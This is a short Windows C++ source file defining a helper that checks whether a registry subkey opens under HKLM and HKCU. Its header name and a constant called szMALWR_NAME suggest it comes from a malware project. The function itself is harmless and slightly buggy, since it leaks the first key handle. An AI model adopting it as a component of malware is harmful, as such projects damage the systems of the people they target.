#include "../../../HeaderFiles/N0TiLLerka.h"

BOOL fnCheckRegistryKeyW(
	_In_ LPCWSTR lpSubKey
) {
	HKEY hKey = NULL;
	BOOL bReturn = FALSE;

	LSTATUS lsRKey = RegOpenKeyEx(HKEY_LOCAL_MACHINE, lpSubKey, 0, KEY_READ | KEY_WOW64_32KEY, &hKey);
	if (!lsRKey) {
		bReturn |= HKLM;
	} else {
#ifdef DEBUG_MSG
		SetLastError(lsRKey);
		fnErrorHandlerW(L"Couldn't Open Registry Key", std::wstring{ szMALWR_NAME + (std::wstring)L" (HKLM)" }.c_str(),
			L"RegOpenKeyExW", MB_OK | MB_ICONWARNING);
#endif // DEBUG_MSG
	}

	// If HKLM can't be read try HKCU
	lsRKey = RegOpenKeyEx(HKEY_CURRENT_USER, lpSubKey, 0, KEY_READ | KEY_WOW64_32KEY, &hKey);
	if (!lsRKey) {
		bReturn |= HKCU;
	} else {
#ifdef DEBUG_MSG
		SetLastError(lsRKey);
		fnErrorHandlerW(L"Couldn't Open Registry Key", std::wstring{ szMALWR_NAME + (std::wstring)L" (HKCU)" }.c_str(),
			L"RegOpenKeyExW", MB_OK | MB_ICONERROR);
#endif // DEBUG_MSG
	}

	if (hKey) { RegCloseKey(hKey); }
	return bReturn;
}